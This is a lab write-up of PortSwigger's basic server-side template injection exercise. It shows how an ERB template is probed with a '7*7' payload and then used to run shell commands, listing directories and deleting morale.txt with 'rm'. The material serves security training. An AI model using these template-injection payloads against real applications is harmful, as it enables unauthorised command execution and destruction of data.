---
title: Basic server-side template injection
description: PortSwigger SSTI Lab
---
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

## Discovery
Message request
```http
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
Host: 0aa600ba03555e7d807880c7004800c9.web-security-academy.net
Cookie: session=HgIgCSoLadH0Xcr1lViMkgomZaqjzD8Z
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0aa600ba03555e7d807880c7004800c9.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

Testing for ERB 
```http
GET /?message=<%25%3d+7*7+%25> HTTP/2
```

Response shows the application is using ERB template. 
```ruby
/usr/lib/ruby/2.7.0/erb.rb:905:in `eval&apos;: (erb):1: syntax error, unexpected &amp; (SyntaxError)
_erbout = +&apos;&apos;; _erbout.&lt;&lt;(( 7*&amp; ).to_s); _erbout
                              ^
	from /usr/lib/ruby/2.7.0/erb.rb:905:in `result&apos;
	from -e:4:in `&lt;main&gt;&apo
```

```ruby
<%= 7 * 7 %>
```

Testing `GET /?message=<%25%3d+7+*+7+%25> HTTP/2` returns `49` which means its vulnerable to SSTI ![](../../../../public/images/PS_SSTI_20250608%20_184642.png)

Testing system commands 
```ruby
<%= `ls /` %>
```

Sending `GET /?message=<%25%3d+`ls+/`+%25> HTTP/2` returns:
![](../../../../public/images/PS_SSTI_20250608%20_185236.png)
## Exploit
Listing carlos directory
```ruby
<%= `ls /home/carlos` %>
```
![](../../../../public/images/PS_SSTI_20250608%20_185459.png)

Deleting `morale.txt`

```ruby
<%= `rm /home/carlos/morale.txt` %>
```

`morale.txt` no longer in `carlos` directory
![](../../../../public/images/PS_SSTI_20250608%20_185704.png)